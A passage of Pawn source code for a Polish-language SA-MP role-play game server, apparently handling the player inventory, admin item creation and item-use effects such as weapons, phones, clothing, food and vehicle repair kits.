			if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
			{
				count++;
			}
		}
	}
	return count;
}



cmd:p (playerid, params[])
{	
	if(pCuffed[playerid])
		return ShowDialogInfo(playerid, "Nie mo¿esz tego zrobiæ bêd¹c skutym.");
	if(PlayerCache[playerid][pBW_Time])
		return ShowDialogInfo(playerid, "Nie mo¿esz tego teraz zrobiæ.");

	new param1[16], param2[16];
	sscanf(params, "s[16]s[16]", param1, param2);

	new items_query[256];
	format(items_query, sizeof(items_query), "SELECT uid, type, val, val2, val3, val4, name, active FROM items WHERE playerUID = '%d' AND state = '%d'", PlayerCache[playerid][pUID], ITEM_STATE_EQ);
	new Cache:cache = mysql_query(DB_HANDLE, items_query);

	new rows = 0;
	cache_get_row_count(rows);


	new uid, type, val, val2, val3, val4, name[128], active, list[1024];

	for(new i=0; i<rows;i++){

		cache_get_value_name_int(i, "uid", uid);
		cache_get_value_name_int(i, "type", type);
		cache_get_value_name_int(i, "val", val);
		cache_get_value_name_int(i, "val2", val2);
		cache_get_value_name_int(i, "val3", val3);
		cache_get_value_name_int(i, "val4", val4);
		cache_get_value_name(i, "name", name);
		cache_get_value_name_int(i, "active", active);

		if(active)
		format(list, sizeof(list), "%s%d\t"HEX_GRAY"%s\t%d,%d,%d,%d,%d\n",
		list, uid, name, type, val, val2, val3, val4);
		else
		format(list, sizeof(list), "%s%d\t%s\t%d,%d,%d,%d,%d\n",
		list, uid, name, type, val, val2, val3, val4);
	}

	cache_delete(cache);


	if(!strlen(list))
	ShowDialogInfo(playerid, ""HEX_WHITE"Nie posiadasz ¿adnych przedmiotów.\nMo¿esz rozejrzeæ siê po okolicy korzystaj¹c z komendy: /p podnies.");
	else
	ShowPlayerDialog(playerid, D_ITEMS, DIALOG_STYLE_TABLIST, "Przedmioty", list, "Wybierz", "Zarz¹dzaj");

	return 1;
	

	/*new iname[32], rest[32];
	sscanf(params, "s[32]s[32]", iname, rest);

	if(!strlen(params))
	{
		if(!strcmp(rest, "odloz", true))
		{
			if(!strlen(iname))
			{
				for(new i; i<MAX_ITEMS; i++)
				{
					if(!ItemCache[i][iUID])
					break;
					if(ItemCache[i][iState] == 0)
					{
						if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
						{
							if(strfind(ItemCache[i][iName], iname, true) != -1)
							{
								if(ItemCache[i][iType] == 1)
								{
									if(ItemCache[i][iActive])
									{
										ResetPlayerWeapons(playerid);
										new str[128]; format(str, sizeof(str), "chowa %s %s", ItemCache[i][iName], rest);
										SendPlayerMe(playerid, str);
										SetTimerEx("HideWeapon", 100, false, "ii", i, playerid);
										return 1;
									}
								}
								return UseItemOption(playerid, 1, ItemCache[i][iUID]);
							}
							else if(ItemCache[i][iType] == 1)
							return SendClientMessage(playerid, COLOR_GRAY, "Masz ju¿ wyci¹gniêt¹ jak¹œ broñ.");

						}
					}
				}
			}
		}
		else if(!strcmp(iname, "podnies", true))
		{
			new pvw=GetPlayerVirtualWorld(playerid), list[1024];

			if(IsPlayerInAnyVehicle(playerid))
			{
				new vid = GetPlayerVehicleID(playerid), vuid = GetVehicleUID(vid);
				if(GroupCache[PlayerCache[playerid][pGroup]][gType] == 1 || GroupCache[PlayerCache[playerid][pGroup2]][gType] == 1 ||
				GroupCache[PlayerCache[playerid][pGroup3]][gType] == 1)
				{

				}
				else if( PlayerCache[playerid][pCurrentVehicle][vState] == 2)
				{
					new guid =  PlayerCache[playerid][pCurrentVehicle][vOwner];

					if(PlayerCache[playerid][pGroup] == guid)
					{
						if(!PlayerCache[playerid][pGroupVehicle])
						{
							return TextDrawForPlayerEx(playerid, 1, "~w~Brak uprawnien.", 3000);
						}
					}
					if(PlayerCache[playerid][pGroup2] == guid)
					{
						if(!PlayerCache[playerid][pGroupVehicle2])
						{
							return TextDrawForPlayerEx(playerid, 1, "~w~Brak uprawnien.", 3000);
						}
					}
					if(PlayerCache[playerid][pGroup3] == guid)
					{
						if(!PlayerCache[playerid][pGroupVehicle3])
						{
							return TextDrawForPlayerEx(playerid, 1, "~w~Brak uprawnien.", 3000);
						}
					}
				}
				else if( PlayerCache[playerid][pCurrentVehicle][vOwner] != PlayerCache[playerid][pUID] &&  PlayerCache[playerid][pCurrentVehicle][vState] == 0)
				{
					return TextDrawForPlayerEx(playerid, 1, "Brak uprawnien.", 3000);
				}
				for(new i; i<MAX_ITEMS; i++)
				{
					if(!ItemCache[i][iUID])
					break;
					if(ItemCache[i][iState] == ITEM_STATE_VEHICLE)
					{
						if(ItemCache[i][iOwner] ==  PlayerCache[playerid][pCurrentVehicle][vUID])
						format(list, sizeof(list), "%s%d\t%s\n", list, i, ItemCache[i][iName]);
					}
				}
				if(strlen(list))
				return ShowPlayerDialog(playerid, D_NEARBY_ITEMS, DIALOG_STYLE_LIST, "Przedmioty w pojeŸdzie", list, "Podnieœ", "Anuluj");
				return TextDrawForPlayerEx(playerid, 1, "Nic nie znaleziono.", 3000);
			}
			else
			{
				for(new i; i<MAX_ITEMS; i++)
				{
					if(ItemCache[i][iState]==1)
					{
						if(IsPlayerInRangeOfPoint(playerid, 5.0, ItemCache[i][iX], ItemCache[i][iY], ItemCache[i][iZ]))
						{
							if(pvw==ItemCache[i][iVW])
							format(list, sizeof(list), "%s%d\t%s\n", list, i, ItemCache[i][iName]);
						}
					}
				}
				if(strlen(list))
				ShowPlayerDialog(playerid, D_NEARBY_ITEMS, DIALOG_STYLE_LIST, "Przedmioty w pobli¿u", list, "Podnieœ", "Anuluj");
				else
				TextDrawForPlayerEx(playerid, 1, "Nic nie znaleziono.", 3000);
				return 1;
			}
		}
		else
		{
			for(new i; i<MAX_ITEMS; i++)
			{
				if(ItemCache[i][iState] == 0)
				{
					if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
					{
						if(strfind(ItemCache[i][iName], iname, true) != -1)
						{
							if(ItemCache[i][iType] == 1)
							{
								pShowingWeapon[playerid] = true;
								SetTimerEx("ShowingWeapon", 3000, false, "i", playerid);
								if(ItemCache[i][iActive])
								{
									ResetPlayerWeapons(playerid);
									new str[128]; format(str, sizeof(str), "chowa %s %s", ItemCache[i][iName], rest);
									SendPlayerMe(playerid, str);
									SetTimerEx("HideWeapon", 100, false, "ii", ItemCache[i][iUID], playerid);
									return 1;
								}
								else if(!ItemCache[i][iActive])
								{
									ItemCache[i][iActive]=1;
									new str[128]; format(str, sizeof(str), "wyci¹ga %s %s", ItemCache[i][iName], rest);
									SendPlayerMe(playerid, str);
									pWeaponUID[playerid] = i;
									SetTimerEx("GiveWeapon", 100, false, "iii", playerid, ItemCache[i][iVal], ItemCache[i][iVal2]);
									return 1;
								}
							}
							return UseItem(playerid, i);
						}
					}
				}
			}
			return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz takiego przedmiotu.");
		}
	}
	else
	{
		new list[524];
		for(new i;i<MAX_ITEMS;i++)
		{
			if(!ItemCache[i][iState])
			{
				if(ItemCache[i][iOwner]==PlayerCache[playerid][pUID])
				{
					format(list, sizeof(list), "%s%d\t"HEX_WHITE"%s\t%d,%d,%d,%d,%d\n", list, i, ItemCache[i][iName], ItemCache[i][iType], ItemCache[i][iVal], ItemCache[i][iVal2], ItemCache[i][iVal3],ItemCache[i][iVal4]);
					if(ItemCache[i][iActive])
					format(info, sizeof(info), "%s%d\t"HEX_GRAY"%s\t"HEX_WHITE"%d,%d,%d,%d,%d\n", list, i, ItemCache[i][iName], ItemCache[i][iType], ItemCache[i][iVal], ItemCache[i][iVal2], ItemCache[i][iVal3],ItemCache[i][iVal4]);
				}
			}
		}
		if(!strlen(list))
		return ShowDialogInfo(playerid, "Nie posiadasz ¿adnych przedmiotów.\nMo¿esz rozejrzeæ siê po okolicy korzystaj¹c z komendy: /p podnies.");
		else
		return ShowPlayerDialog(playerid, D_ITEMS, DIALOG_STYLE_TABLIST, "Przedmioty", list, "Wybierz", "Zarz¹dzaj");
	}*/
}

forward ShowingWeapon(playerid);
public ShowingWeapon(playerid)
pShowingWeapon[playerid] = false;

CMD:przeszukaj (playerid, params[])
{
	if(GroupCache[pDuty[playerid]][gType] == 1 || GroupCache[pDuty[playerid]][gType] == 16)
	{

	}
	else
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê na s³u¿bie odpowiedniej grupy by u¿yæ tej komendy.");
	}
	new targetid;
	if(sscanf(params, "r", targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /przeszukaj [ID/Czêœc nazwy gracza] by podejrzeæ przedmioty w ekwipunku.");
	if(targetid == playerid)
	return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz przeszukaæ samego siebie.");
	if(!pLogged[targetid])
	return SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest pod³¹czony lub zalogowany do serwera.");
	new Float:targetX, Float:targetY, Float:targetZ;
	GetPlayerPos(targetid, targetX, targetY, targetZ);
	if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(targetid) || !IsPlayerInRangeOfPoint(playerid, 5.0, targetX, targetY, targetZ) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Wybrany gracz jest za daleko.");
	new list[1000], info[256];
	for(new i;i<MAX_ITEMS;i++)
	{
		if(!ItemCache[i][iState])
		{
			if(ItemCache[i][iOwner]==targetid)
			{
				format(info, sizeof(info), "%d\t"HEX_WHITE"%s\t%d,%d,%d,%d,%d\n", ItemCache[i][iUID], ItemCache[i][iName], ItemCache[i][iType], ItemCache[i][iVal], ItemCache[i][iVal2], ItemCache[i][iVal3], ItemCache[i][iVal4]);
				if(ItemCache[i][iActive])
				format(info, sizeof(info), "%d\t"HEX_GRAY"%s\t"HEX_WHITE"%d,%d,%d,%d,%d\n", ItemCache[i][iUID], ItemCache[i][iName], ItemCache[i][iType], ItemCache[i][iVal], ItemCache[i][iVal2], ItemCache[i][iVal3], ItemCache[i][iVal4]);
				strins(list, info, strlen(list));
			}
		}
	}
	new header[64];
	format(header, sizeof(header), "przeszukuje %s", RPName(targetid));
	SendPlayerMe(playerid, header);
	if(Isnull(list))
	return ShowDialogInfo(playerid, "Ten gracz nie posiada ¿adnych przedmiotów.");
	format(header, sizeof(header), "Przedmioty %s", RPName(targetid));
	return ShowPlayerDialog(playerid, D_NEARBY_ITEMS, DIALOG_STYLE_TABLIST, header, list, "Zabierz", "Anuluj");
}

CMD:c (playerid, params[])
{
	if(PlayerCache[playerid][pBW_Time])
	return 1;
	new text[128];
	if(sscanf(params, "s[128]", text))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /c [szept na odleg˜˜oœæ 1m!]");	
	new Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y, Z);
	new msg[128]; format(msg, sizeof(msg), "%s szepcze: %s", strreplace(ReturnPlayerName(playerid), '_', ' '), text);
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(IsPlayerInRangeOfPoint(i, 1.0, X, Y, Z))
			{
				SendClientMessage(i, CHAT_SHADE_1,msg);
			}
		}
	}
	return SendPlayerMe(playerid, "coœ szepcze.");
}

CMD:ai(playerid, params[])
{
	if(PlayerCache[playerid][pLevel] == ADMINISTRATION || pDuty[playerid] == 16 || PlayerCache[playerid][pLevel] == DEVELOPER)
	{
		new players_item_query[128];
		format(players_item_query, sizeof(players_item_query), "SELECT * FROM items WHERE playerUID = '%d'", PlayerCache[playerid][pUID]);
		new Cache:cache = mysql_query(DB_HANDLE, players_item_query);

		new rows = 0;
		cache_get_row_count(rows);

		cache_delete(cache);

		if(rows > 20)
			return SendClientMessage(playerid, COLOR_GRAY, "W ekwipunku nie zmieœci siê a¿ tyle przedmiotów.");
		new type, val, val2, val3, val4, name[128];
		if(sscanf(params, "iiiiis[128]", type, val, val2, val3,val4, name))

		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /ai [Typ] [wartoœæ 1] [wartoœæ 2] [wartoœæ 3] [wartoœæ 4] [Nazwa]");
		new itemUID = CreateItem(PlayerCache[playerid][pUID], type, val, val2, val3,val4, name);



		format(name, sizeof(name), "Stworzono przedmiot (UID: %d)", itemUID);
		SendClientMessage(playerid, -1, name);
	}
	return 1;
}

CMD:aprodukt(playerid, params[])
{
	if(PlayerCache[playerid][pLevel] == ADMINISTRATION || pDuty[playerid] == 16 || PlayerCache[playerid][pLevel] == DEVELOPER)
	{
		new grouptype, price, type, val, val2, val3, val4, group, name[128];
		if(sscanf(params, "iiiiiiiis[128]", grouptype, price, type, val, val2, val3,val4, group, name))
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /aprodukt [typ grupy] [cena za sztuke] [Typ przedmiotu] [wartoœæ 1] [wartoœæ 2] [wartoœæ 3] [wartoœæ 4] [UID grupy] [Nazwa]");

		CreateItem(PlayerCache[playerid][pUID], type, val, val2, val3,val4, name);

		ItemCache[MAX_ITEMS-1][iState] = ITEM_STATE_LIST;
		ItemCache[MAX_ITEMS-1][iOwner] = grouptype;
		ItemCache[MAX_ITEMS-1][iCost] = price;

		format(name, sizeof(name), "Stworzono produkt dla rodzaju grupy: "HEX_BLUE"%s"HEX_WHITE" o nazwie: %s z cen¹ %d za sztukê.",GetGroupType(ItemCache[MAX_ITEMS-1][iOwner]), ItemCache[MAX_ITEMS-1][iName], ItemCache[MAX_ITEMS-1][iCost]);
		SendClientMessage(playerid, -1, name);
	}
	return 1;
}

CMD:kup (playerid, params[])
{
/*	new guid = DoorCache[GetPlayerDoorUID(playerid)][dGroupUID];
	if(GroupCache[guid][gType] != 7)
	return TextDrawForPlayerEx(playerid, 1, "Nie znajdujesz sie w budynku odpowiedniej grupy.", 5000);
	new list[1025] = "#\tNazwa\tCena\tIloœæ\n", info[128], count;
	for(new i; i<MAX_ITEMS; i++)
	{
		if(ItemCache[i][iState] == ITEM_STATE_PRODUCT)
		{
			if(ItemCache[i][iOwner] == guid)
			{
				format(info, sizeof(info), "%d\t%s\t"HEX_GREEN"$%d"HEX_WHITE"\tx%d\n", i, ItemCache[i][iName], ItemCache[i][iCost], ItemCache[i][iVW]); // vw - amount of items
				strins(list, info, strlen(list));
				count++;
			}
		}
	}
	if(!count)
	return ShowDialogInfo(playerid, "Brak produktów w magazynie.");
	return ShowPlayerDialog(playerid, D_24, DIALOG_STYLE_TABLIST_HEADERS, "Dostêpne produkty", list, "Kup", "Anuluj");*/
}

forward CanPlayerUseItem(playerid, itemuid);
public CanPlayerUseItem(playerid, itemuid){
	new query[256];
	format(query, sizeof(query), "SELECT NULL FROM items INNER JOIN players ON players.uid=items.playerUID AND players.uid=%d LEFT OUTER JOIN groupMembers ON groupMembers.playerUID=%d AND groupMembers.groupUID=items.groupUID WHERE items.uid=%d LIMIT 1;", PlayerCache[playerid][pUID], PlayerCache[playerid][pUID], itemuid);
	new Cache:cache = mysql_query(DB_HANDLE, query);
	new rows = cache_num_rows();
	cache_delete(cache);
	if(rows)
		return true;
	return false;
}

stock UseItem(playerid, itemuid)
{
	pVal[playerid] = itemuid;

	new itemQuery[256];
	format(itemQuery, sizeof(itemQuery), "SELECT groupUID, playerUID, state, type, val, val2, val3, val4, active, name FROM items WHERE uid = '%d' LIMIT 1", itemuid);
	new Cache:cache = mysql_query(DB_HANDLE, itemQuery);

	new groupUID, playerUID, status, type, val, val2, val3, val4, owner, active, name[128];

	cache_get_value_name_int(0, "state", status);
	cache_get_value_name_int(0, "type", type);
	cache_get_value_name_int(0, "val", val);
	cache_get_value_name_int(0, "val2", val2);
	cache_get_value_name_int(0, "val3", val3);
	cache_get_value_name_int(0, "val4", val4);
	cache_get_value_name_int(0, "owner", owner);
	cache_get_value_name_int(0, "active", active);
	cache_get_value_name_int(0, "groupUID", groupUID);
	cache_get_value_name_int(0, "playerUID", playerUID);
	cache_get_value_name(0, "name", name);

	cache_delete(cache);



	if(!CanPlayerUseItem(playerid, itemuid))
		return TextDrawForPlayerEx(playerid, 1, "Ten przedmiot nie nalezy do Ciebie.", 3000);
	

	if(status != ITEM_STATE_EQ)
	return 1;

	switch(type)
	{
		case 0: return ShowDialogInfo(playerid, "Ten przedmiot s³u¿y do gry RolePlay i nie ma ¿adnych zastosowañ skryptowych.");
		case 1:
		{
			if(val2 == 0)
			return SendClientMessage(playerid, COLOR_GRAY, "W tej broni skoñczy³a siê amunicja.");
			
			format(itemQuery, sizeof(itemQuery), "SELECT * FROM items WHERE playerUID = '%d' AND type = '1' AND active = '1' AND uid != '%d' LIMIT 1", PlayerCache[playerid][pUID], itemuid);
			cache = mysql_query(DB_HANDLE, itemQuery);
			
			cache_delete(cache);

			if(cache_num_rows())
			return SendClientMessage(playerid, COLOR_GRAY, "Masz ju¿ wyjêt¹ jak¹œ broñ.");

			return ShowDialogUseWeap(playerid);
		}
		case 2:
		{
			for(new i; i<MAX_ITEMS;i++)
			{
				if(!ItemCache[i][iState])
				{
					if(ItemCache[i][iOwner]==PlayerCache[playerid][pUID])
					{
						if(ItemCache[i][iType]==2)
						{
							if(ItemCache[i][iActive])
							{
								if(i != itemuid)
								{
									return SendClientMessage(playerid, COLOR_GRAY, "Aktywny mo¿esz mieæ tylko jeden telefon.");
								}
							}
						}
					}
				}
			}
			if(pCalling[playerid] != -1)
			{
				return ShowDialogAnswer(playerid);
			}
			if(pTalking[playerid] != -1)
			{
				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
				SetPlayerSpecialAction(pTalking[playerid], SPECIAL_ACTION_STOPUSECELLPHONE);
				GameTextForPlayer(pTalking[playerid], "~w~rozmowca rozlaczyl sie", 3000, 4);
				pTalking[playerid] = -1;
				return 1;
			}
			if(!ItemCache[itemuid][iActive])
			{
				if(!ItemCache[itemuid][iVal])
				return TextDrawForPlayerEx(playerid, 1, "W telefonie jest brak karty SIM.", 5000);
				GameTextForPlayer(playerid, "~w~telefon wlaczony", 3000, 4);
				ItemCache[itemuid][iActive]=1;
			}
			pVal[playerid] = itemuid;
			return ShowDialogPhone(playerid);
		}
		case 3:
		{
			new seat;
			new id;
			if(IsPlayerInAnyVehicle(playerid))
			{
				seat = GetPlayerVehicleSeat(playerid);
				id = GetPlayerVehicleID(playerid);
			}
			format(itemQuery, sizeof(itemQuery), "SELECT type FROM items WHERE type = '3' AND active = '1' AND uid != '%d' LIMIT 1",
			itemuid);
			cache = mysql_query(DB_HANDLE, itemQuery);

			if(cache_num_rows())
			{
				SendClientMessage(playerid, COLOR_GRAY, "Masz ju¿ na sobie za³o¿one jakieœ ubranie.");
				cache_delete(cache);
			}
			else
			{
				if(active)
				{
					format(itemQuery, sizeof(itemQuery), "UPDATE items SET active = '0' WHERE uid = '%d' LIMIT 1", itemuid);
					mysql_query(DB_HANDLE, itemQuery);
					ClearAnimations(playerid);
					SetPlayerSkin(playerid, PlayerCache[playerid][pSkin]);
				}
				else
				{
					ClearAnimations(playerid);
					SetPlayerSkin(playerid, val);
					format(itemQuery, sizeof(itemQuery), "UPDATE items SET active = '1' WHERE uid = '%d' LIMIT 1", itemuid);
					mysql_query(DB_HANDLE, itemQuery);
				}
				SendPlayerMe(playerid, "przebiera siê");
				if(id)
				PutPlayerInVehicle(playerid, id, seat);
			}
			return 1;
		}
		case 4:
		{
			new str[256];
			format(str, sizeof(str), "spo¿ywa %s", name);

			switch(val3)
			{
				case 1:
				{
					if(PlayerCache[playerid][pHealth] < 10)
					{
						PlayerCache[playerid][pHealth] += 10-PlayerCache[playerid][pHealth];
						SetPlayerHealth(playerid, PlayerCache[playerid][pHealth]);
						format(str, sizeof(str), "UPDATE players SET health = '%f' WHERE uid = '%d' LIMIT 1", PlayerCache[playerid][pHealth],
						PlayerCache[playerid][pUID]);
						mysql_query(DB_HANDLE, str);
						format(str, sizeof(str), "DELETE FROM items WHERE items.uid = '%d' LIMIT 1", itemuid);
						mysql_query(DB_HANDLE,str);
					}
					else
					{
						return TextDrawForPlayerEx(playerid, 1, "Twoj stan zdrowia jest zbyt dobry na uzycie ~y~~h~leku.", 5000);
					}
				}
				case 2:
				{
					new h,m,s;
					format(itemQuery, sizeof(itemQuery), "UPDATE players SET gym_boost_time = '%d' where uid = '%d' LIMIT 1", gettime(h,m,s), PlayerCache[playerid][pUID]);
					mysql_query(DB_HANDLE, itemQuery);

					SetPlayerDrunkLevel(playerid, 5001);

					format(str, sizeof(str), "wstrzykuje sobie %s", name);
					SendPlayerMe(playerid, str);
					ApplyAnimation(playerid, "ped", "gum_eat", 4.1, 0, 0, 0, 0, 0);
					return ShowDialogInfo(playerid, "Wspomagacz na si³ownie zosta³ przez Ciebie u¿yty.\nW ci¹gu godziny udaj siê poæwiczyæ na si³ownie by zwiêkszyæ zdobyt¹ si³ê dwa razy.");
				}
				default:
				{
					PlayerCache[playerid][pHealth]+=val2;
					SetPlayerHealth(playerid, PlayerCache[playerid][pHealth]);
				}
			}

			switch(val2)
			{
				case 0: ApplyAnimation(playerid, "FOOD", "eat_burger", 4.1, 0, 0, 0, 0, 0, 0);
				case 1: SetPlayerSpecialAction(playerid, 20);
				case 2: SetPlayerSpecialAction(playerid, 22);
				case 3: SetPlayerSpecialAction(playerid, 23);
			}

			SendPlayerMe(playerid, str);
		}
		case 5:
		{
			new Float:X, Float:Y, Float:Z;
			GetPlayerPos(playerid, X, Y, Z);
			new vw = GetPlayerVirtualWorld(playerid);
			for(new j=1; j < MAX_ITEMS; j++)
			{
				if(ItemCache[j][iState] == 0)
				{
					if(ItemCache[j][iActive])
					{
						if(ItemCache[j][iOwner] == PlayerCache[playerid][pUID])
						{
							if(ItemCache[j][iType] == 5)
							{
								DestroyDynamicObject(ItemCache[j][iVal]);
								ItemCache[j][iActive] = 0;
								for(new i; i<=GetPlayerPoolSize(); i++)
								{
									if(IsPlayerConnected(i))
									{
										if(IsPlayerInRangeOfPoint(i, 50, X, Y, Z))
										{
											if(GetPlayerVirtualWorld(i) == vw)
											{
												StopAudioStreamForPlayer(i);
											}
										}
									}
								}
							}
						}
					}
				}
			}
			return ShowDialogBoomBox(playerid);
		}
		case 6:
		{
			new msg[128];
			new rand = random(6);
			format(msg, sizeof(msg), "* %s wylosowa³ liczbê %d (z 1-6) u¿ywaj¹c %s. *", RPName(playerid), rand+1, ItemCache[itemuid][iName]);
			if(PlayerCache[playerid][pGender])
			format(msg, sizeof(msg), "* %s wylosowa³a liczbê %d (z 1-6) u¿ywaj¹c %s. *", RPName(playerid), rand+1, ItemCache[itemuid][iName]);
			return SendPlayerMessageInRange(playerid, msg, DO_SHADE_1, DO_SHADE_2, DO_SHADE_3, DO_SHADE_4, DO_SHADE_5, DO_SHADE_6, false);
		}
		case 7:
		{
			return ShowDialogInfo(playerid, "JUTRO ZROBIE XD");
		}
		case 8:
		{
			CreateSystemVehicle(playerid, ItemCache[itemuid][iVal], random(255), random(255),-199.4787,1223.2294,19.7113, playerid, 0,178.2287, ItemCache[itemuid][iVal2], 0);
			SpawnVehicle(LastvUID-1);
			ItemCache[itemuid][iState] = 3;
			MapIcon[playerid] = CreateDynamicMapIcon(876.5847,-1259.2781,14.6456, 55,-1,  0, 0, playerid,60000, 3, 60000);
			MapIconTimer[playerid] = SetTimerEx("DestroyIcon", 5000*60, false, "i", playerid);
			return TextDrawForPlayerEx(playerid, 1, "Pojazd zostal zespawnowany!~n~Ikona samochodu pojawila sie na radarze.", 10000);
		}
		case 9:
		{
			if(IsPlayerInAnyVehicle(playerid))
			return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz znajdowaæ siê w pojeŸdzie.");
			for(new i; i<MAX_ITEMS; i++)
			{
				if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
				{
					if(ItemCache[i][iType] == 9)
					{
						if(ItemCache[i][iState] == 0)
						{
							if(ItemCache[i][iUID] == itemuid)
							{
								if(ItemCache[i][iActive])
								{
									ItemCache[i][iActive] = 0;
									KillTimer(PlayerRepairingVehicle[playerid][repairTimer]);
									return GameTextForPlayer(playerid, "~r~~h~naprawa anulowana", 3000, 4);
								}
							}
							else if(ItemCache[i][iUID] != itemuid && ItemCache[i][iActive])
							return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz wyj¹æ kolejnego zestawu naprawczego.");
						}
					}
				}
			}
			new vehicleid = GetPlayerCameraTargetVehicle(playerid);
			if(vehicleid)
			{
				new Float:X, Float:Y, Float:Z;
				GetVehiclePos(vehicleid, X, Y, Z);
				if(!IsPlayerInRangeOfPoint(playerid, 5.0, X, Y, Z))
					return GameTextForPlayer(playerid, "~r~~h~stan blizej", 3000, 4);

				PlayerRepairingVehicle[playerid][repairVehicleID] = vehicleid;
				
				new Float:health;
				GetVehicleHealth(vehicleid, health);

				if(health > 300)
					return TextDrawForPlayerEx(playerid, 1, "Ten pojazd jest w stanie uruchomic silnik~n~Naprawa jest niepotrzebna.", 3000);
				TextDrawForPlayerEx(playerid, 1, "Rozpoczynasz naprawe pojazdu.~n~Odegraj akcje RolePlay naprawy pojazdu.", 10000);
				PlayerRepairingVehicle[playerid][repairTime] = 30;
				PlayerRepairingVehicle[playerid][repairTimer] = SetTimerEx("RepairingVehicle", 1000, true, "i", playerid);
			}
			return GameTextForPlayer(playerid, "~r~~h~spojrz na pojazd", 3000, 4);
		}
		case 10:
		{
			for(new i; i<=GetVehiclePoolSize(); i++)
			{
					if(IsPlayerInRangeOfVehicle(playerid, i, 5.0)){
						


					/*	new fuel =  0;
						if( PlayerCache[playerid][pCurrentVehicle][vEngine])
						return ShowDialogInfo(playerid, "Silnik  w tym pojeŸdzie musi byæ zgaszony.");
						if(fuel + ItemCache[itemuid][iVal] > 100)
						return TextDrawForPlayerEx(playerid, 1, "W tym pojezdzie nie zmiesci sie az tyle paliwa.", 3000);
						if(IsPlayerInAnyVehicle(playerid))
						return ShowDialogInfo(playerid, "Nie mo¿esz u¿yæ tej funkcji znajduj¹c siê w pojeŸdzie.");
							PlayerCache[playerid][pCurrentVehicle][vFuel] += ItemCache[itemuid][iVal];
						new str[128]; format(str, sizeof(str), "uzupe³nia bak paliwa pojazdu marki %s", GetVehicleName(GetVehicleModel(i)));
						ApplyAnimation(playerid, "BD_FIRE", "wash_up", 4.1, 0, 0, 0, 0, 0, 0);
						ItemCache[itemuid][iState] = 3;*/
						//return SendPlayerMe(playerid, str);
					}
				
				
			}
			return TextDrawForPlayerEx(playerid, 1, "Nie znajdujesz sie w poblizu zadnego pojazdu.", 3000);
		}
		case 11:
		{
			new weapontoload = ItemCache[itemuid][iVal], list[256], info[64], count;
			for(new i; i<MAX_ITEMS; i++)
			{
				if(ItemCache[i][iType] == 1)
				{
					if(ItemCache[i][iVal] == weapontoload)
					{
						if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
						{
							if(ItemCache[i][iState] == 0)
							{
								format(info, sizeof(info), "%d\t%s\n", ItemCache[i][iUID], ItemCache[i][iName]);
								strins(list, info, strlen(list)); count++;
							}
						}
					}
				}
			}
			if(count)
			return ShowPlayerDialog(playerid, D_AMMO, DIALOG_STYLE_LIST, "Wybierz broñ", list, "Wybierz", "Anuluj");
			return ShowDialogInfo(playerid, "Brak pasuj¹cych przedmiotów do tego rodzaju amunicji.");
		}
		case 12:
		{
			for(new i; i<MAX_ITEMS; i++)
			{
				if(ItemCache[i][iType] == 12)
				{
					if(ItemCache[i][iState] == 0)
					{
						if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
						{
							if(ItemCache[i][iActive])
							{
								if(ItemCache[i][iUID] == itemuid)
								{
									ItemCache[i][iActive] = 0;
									if(ItemCache[i][iVal4])
									{
										new hideMsg[128];
										format(hideMsg, sizeof(hideMsg), "zdejmuje %s.", ItemCache[itemuid][iName]);
										SendPlayerMe(playerid, hideMsg);
										SetPlayerName(playerid, PlayerCache[playerid][pName]);
										UpdatePlayerName(playerid);
										SetPlayerScore(playerid, PlayerCache[playerid][pScore]);																		
									}
									return RemovePlayerAttachedObject(playerid, ItemCache[i][iVal2]);
								}
							}
						}
					}
				}
			}
			new model = ItemCache[itemuid][iVal];
			new Float:X, Float:Y, Float:Z;
			GetPlayerPos(playerid, X, Y, Z);
			new index;
			if(!IsPlayerAttachedObjectSlotUsed(playerid, 0))
			index = 0;
			else if(!IsPlayerAttachedObjectSlotUsed(playerid, 1))
			index = 1;
			else if(!IsPlayerAttachedObjectSlotUsed(playerid, 2))
			index = 2;
			else if(!IsPlayerAttachedObjectSlotUsed(playerid, 3))
			index = 3;
			else if(!IsPlayerAttachedObjectSlotUsed(playerid, 4))
			index = 4;
			else return ShowDialogInfo(playerid, "Posiadasz ju¿ limit doczepianych akcesorium na raz.");
			ItemCache[itemuid][iVal2] = index;
			new bone = ItemCache[itemuid][iVal3];

			SetPlayerAttachedObject(playerid, index, model, bone, ItemCache[itemuid][iAttachX], ItemCache[itemuid][iAttachY], ItemCache[itemuid][iAttachZ], ItemCache[itemuid][iAttachrX], ItemCache[itemuid][iAttachrY],
			ItemCache[itemuid][iAttachrZ], ItemCache[itemuid][iSizeX], ItemCache[itemuid][iSizeY], ItemCache[itemuid][iSizeZ],0, 0);

			if(!ItemCache[itemuid][iAttachX] && !ItemCache[itemuid][iAttachY] && !ItemCache[itemuid][iAttachZ] && !ItemCache[itemuid][iAttachrX] && !ItemCache[itemuid][iAttachrY] && !ItemCache[itemuid][iAttachrZ] &&
			ItemCache[itemuid][iSizeX]==1 && ItemCache[itemuid][iSizeY]==1 && ItemCache[itemuid][iSizeZ]==1)
			EditAttachedObject(playerid, index);

			if(ItemCache[itemuid][iVal4])
			{
				new msg[128];
				format(msg, sizeof(msg), "zak³ada %s.", ItemCache[itemuid][iName]);
				SendPlayerMe(playerid, msg);
